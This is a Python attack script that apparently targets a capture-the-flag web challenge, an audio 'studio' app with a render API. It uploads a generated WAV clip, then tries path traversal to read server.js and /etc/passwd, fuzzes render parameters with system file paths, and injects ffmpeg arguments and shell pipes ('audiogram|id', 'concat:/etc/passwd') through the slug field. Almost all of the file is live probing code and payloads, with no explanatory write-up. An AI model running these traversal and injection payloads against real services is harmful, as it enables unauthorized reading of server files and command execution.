#!/usr/bin/env python3
import io, json, re, struct, math, urllib.request, urllib.error, http.cookiejar

BASE = "https://d7eef812-5707-splice-c7f97.mystery-challenges.webverselabs-pro.com"
cj = http.cookiejar.CookieJar()
opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
opener.addheaders = [("User-Agent", "Mozilla/5.0 studio")]

def do(path, data=None, headers=None, method=None):
    r = urllib.request.Request(BASE + path, data=data, method=method)
    for k, v in (headers or {}).items(): r.add_header(k, v)
    try:
        resp = opener.open(r, timeout=90); return resp.status, dict(resp.getheaders()), resp.read()
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers), e.read()
    except Exception as e:
        return -1, {}, str(e).encode()

def make_wav(seconds=1, rate=8000):
    n=seconds*rate
    fr=b"".join(struct.pack("<h",int(3000*math.sin(2*math.pi*220*i/rate))) for i in range(n))
    return b"RIFF"+struct.pack("<I",36+len(fr))+b"WAVE"+b"fmt "+struct.pack("<IHHIIHH",16,1,1,rate,rate*2,2,16)+b"data"+struct.pack("<I",len(fr))+fr

def multipart(fn, content):
    b="----wbnd"; body=io.BytesIO()
    body.write(f"--{b}\r\nContent-Disposition: form-data; name=\"clip\"; filename=\"{fn}\"\r\nContent-Type: audio/wav\r\n\r\n".encode()); body.write(content); body.write(b"\r\n")
    body.write(f"--{b}--\r\n".encode()); return body.getvalue(), f"multipart/form-data; boundary={b}"

def upload(fn="clip.wav", content=None):
    if content is None: content=make_wav()
    body,ct=multipart(fn,content); return do("/studio/upload",data=body,headers={"Content-Type":ct},method="POST")

def render(**kw):
    st,h,b=do("/api/render",data=json.dumps(kw).encode(),headers={"Content-Type":"application/json"},method="POST")
    try: return st, json.loads(b)
    except: return st, b.decode('utf-8','replace')

do("/studio"); upload()

print("########## FULL STDERR on normal render ##########")
st,j=render(slug="audiogram",theme="midnight")
print(st, json.dumps(j)[:200])
st,j=render(slug="../../server.js",theme="midnight")
print("\n--- traversal ../../server.js FULL errors ---")
print(json.dumps(j, indent=1)[:6000])

print("\n########## render PARAM FUZZ ##########")
for kw in [
    {"slug":"x","theme":"midnight","format":"txt"},
    {"slug":"x","theme":"midnight","formats":["png","mp3"]},
    {"slug":"x","theme":"midnight","ext":"mp3"},
    {"slug":"x","theme":"midnight","input":"/etc/passwd"},
    {"slug":"x","theme":"midnight","source":"/etc/passwd"},
    {"slug":"x","theme":"midnight","clip":"/etc/passwd"},
    {"slug":"x","theme":"../../../../etc/passwd"},
    {"slug":"x","theme":"midnight","width":99999},
    {"slug":"x","theme":"midnight","args":["-i","/etc/passwd"]},
    {"slug":"x"},
    {"theme":"midnight"},
    {},
]:
    st,j=render(**kw)
    print(f"\n>> {json.dumps(kw)[:80]} -> {st}")
    print(json.dumps(j)[:500] if not isinstance(j,str) else j[:300])

print("\n########## ffmpeg argument injection via slug (output arg) ##########")
# slug becomes output filename with .png appended; try to break out with ffmpeg opts / protocols
for slug in ["audiogram", "audiogram.png -i /etc/passwd", "concat:/etc/passwd", "/etc/passwd",
             "audiogram|id", "audiogram.mp3", "a.png -frames 1 /tmp/x.png -y /etc/passwd"]:
    st,j=render(slug=slug,theme="midnight")
    print(f"\n>> slug={slug!r} -> {st}")
    print(json.dumps(j)[:400] if not isinstance(j,str) else j[:300])

print("\nDONE")
